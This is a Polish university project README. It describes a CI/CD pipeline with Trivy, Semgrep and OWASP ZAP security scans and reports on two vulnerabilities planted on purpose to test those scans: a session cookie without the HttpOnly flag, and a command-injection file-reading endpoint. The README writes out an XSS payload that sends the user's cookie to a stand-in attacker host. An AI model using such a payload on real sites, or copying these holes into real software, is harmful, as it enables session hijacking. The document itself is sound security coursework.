# TBO projekt

## Zadanie 1
Proces CICD w projekcie wydzielony został na dwa workflowy:
- uruchamiany przy wypychaniu zmian na gałąź *main*
- uruchamiany przy wypychaniu zmian na pozostałe gałęzie repozytorium

Oba workflowy są w zasadzie podobne, różnice dotyczą jedynie momentu budowania obrazu. Obraz dockera budowany jest z gałęzi main z tagiem **:latest**, a z pozostałych gałęzi z tagiem **:beta**.  


Proces CICD składa się z następujących jobów:
- *security-tests-trivy*
  
    Odpowiada za przeprowadzenie skanów SCA (Software Composition Analysis).  
   Wykorzystane narzędzie: **Trivy**  
   - Skany są ograniczone do podatności o poziomie `HIGH` i `CRITICAL`.  
   - W przypadku wykrycia podatności proces CICD kończy się niepowodzeniem.
- *security-tests-semgrep*
  
    Odpowiada za przeprowadzenie skanów SAST (Static Application Security Testing).  
   Wykorzystane narzędzie: **Semgrep**  
   - Skany są wykonywane przy użyciu reguł `p/security-audit`.  
   - W przypadku wykrycia podatności proces CICD zostaje przerwany.
- *security-tests-owasp-zap*
  
    Odpowiada za przeprowadzenie skanów DAST (Dynamic Application Security Testing).  
   Wykorzystane narzędzie: **OWASP ZAP**  
   - Narzędzie skanuje aplikację uruchomioną w kontenerze dockerowym.  
   - W przypadku wykrycia podatności proces CICD kończy się niepowodzeniem.
- *test*
  
    Wykonuje testy jednostkowe aplikacji. W istocie składają się one z jednego prostego testu zaimplementowanego w celu symulacji całego joba. Przy bieżącej implementacji testów będą one zawsze kończyły się sukcesem.
- *build-and-publish*
   - Buduje oraz wypycha obraz z odpowiednim tagiem (latest lub beta) do publicznego repozytorium Docker Hub. 
   - Proces wykona się jedynie w przypadku, gdy wszystkie testy (jednostkkowe oraz bezpieczeństwa) zakończą się powodzeniem. Jeśli przynajmniej jeden z testów nie powiedzie się, obraz nie zostanie wdrożony.


## Zadanie 2

W repozytorium na gałęzi *vulnerabilities* zostały wykonane dwa commity, dodające dwie podatności do aplikacji. Każdy z commitów uruchomił zaimplementowany proces CICD, zawierający skanowanie SCA, SAST, DAST oraz uruchomienie testów jednostkowych.
Do kodu zostały wstrzyknięte następujące podatności:
1. **ciasteczko bez flagi *HttpOnly*** - pierwsza z nich obejmowała zmianę konfiguracji uruchamianej aplikacji w taki sposób, że ustawiane użytkownikowi ciasto JSESSIONID nie ma ustawionej flagi *HttpOnly*.

![cookie_httponly](https://github.com/user-attachments/assets/e936080d-4d7b-4e5e-87bf-d8f0bbd14a5d)


Taka podatność oznacza, że ciasteczko może być odczytane i modyfikowane przez skrypty po stronie klienta, np. za pomocą JavaScriptu (document.cookie). W przypadku wystąpienia podatności XSS, wstrzyknięty przez atakującego kod miałby dostęp do ciastek użytkownika. Zagrożeniem jest tutaj kradzież sesji użytkownika wynikająca z przejęcia ciastka.
W naszej aplikacji już wcześniej występowała podatność XSS, między innymi w polu *Name* obiektu *Student*. Potencjalny atakujący mógłby użyć następującego payloadu wstrzykniętego w nazwę użytkownika, co skutkowałoby wysłaniem wartości ciastka użytkownika na serwer atakującego:
```
<script>var xhr = new XMLHttpRequest();xhr.open("GET", "http://attacker.com/?cookie=" + document.cookie, true);xhr.send();</script>
```
Zaimplementowany proces CICD wykrył dodaną podatność na etapie skanowana DAST. Narzędzie ZAP w raporcie z dynamicznej analizy zwróciło następujący wynik:

![zap](https://github.com/user-attachments/assets/e92ff127-121c-4c23-baf0-e2ce6ea8a4ae)


2. **Command Injection** - do aplikacji został dodany nowy endpoint, służący do odczytu plików tekstowych znajdujących się na serwerze. Został zdefiniowany endpoint */files/read-file*, który w parametrze URL przyjmuje nazwę pliku do otwarcia. 


![read_file](https://github.com/user-attachments/assets/ddeca1d8-849a-479b-bbc2-220879506c5f)


Nowy endpoint zawiera podatność - możliwe jest wstrzyknięcie komendy w parametrze *fileName*

![injection](https://github.com/user-attachments/assets/17dc551b-5042-44fd-b3de-a4f56caf8a0e)

Niestety podatność nie została wykryta na żadnym z etapów skanowania. Możliwą przyczyną jest brak odwołania do tego endpointu w HTML strony, co skutkowało nieprzeskanowaniem tego endpointu przez narzędzie OWASP ZAP. Ta sytuacja podkreśla zagrożenie wynikające z ukrytych w aplikacji endpointów. Jeżeli endpoint nie jest dostępny z GUI, to nie znaczy, że atakujący go nie znajdzie. Pozostawianie zbędnych aktywnych endpointów, które nie są widoczne z frontu, może stanowić istotne zagrożenie dla bezpieczeństwa aplikacji. Takie endpointy mogą być nieużywanymi pozostałościami po wcześniejszych implementacjach lub funkcjonalnościami z niekontrolowanym dostępem, które nie zostały odpowiednio zabezpieczone. Brak ich widoczności w narzędziach takich jak OWASP ZAP może utrudniać wykrycie potencjalnych podatności, co podkreśla konieczność regularnych przeglądów i usuwania niepotrzebnych lub nieużywanych punktów dostępowych w aplikacji.
